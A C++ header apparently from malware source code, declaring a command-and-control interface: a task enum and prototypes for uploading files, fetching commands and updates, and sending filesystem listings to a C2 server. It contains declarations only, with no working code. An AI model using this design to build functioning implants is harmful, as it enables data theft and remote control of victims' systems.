// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#ifndef __INC_C2_HPP__
#define __INC_C2_HPP__

#include <Windows.h>

enum ETask
{
	TASK_INVALID,
	TASK_UNINSTALL,
	TASK_UPDATE,
	TASK_RESET,
	TASK_UPLOAD,
};

#ifdef _DEBUG
static const char sc_szTasks[5][15] =
{
	"TASK_INVALID",
	"TASK_UNINSTALL",
	"TASK_UPDATE",
	"TASK_RESET",
	"TASK_UPLOAD"
};
#endif // _DEBUG

BOOL SendFileToC2(LPCSTR lpszFileToSend, const char *lpszSendName);
BOOL SendFileTokenToC2(const char *lpszFileText, int nFileTextLen, const char *lpszFileName, DWORD dwFileStart, DWORD *dwRetSize);
int GetTaskFromC2();
BOOL TaskUpdate();
LPVOID GetFromURL(LPCSTR szURL, DWORD *lpdwMemLength);
BOOL GetCMDFromC2();
BOOL SendCMDRecvToC2();
BOOL SendEnumFSToC2();
BOOL SendDNListFilesToC2();

#endif // __INC_C2_HPP__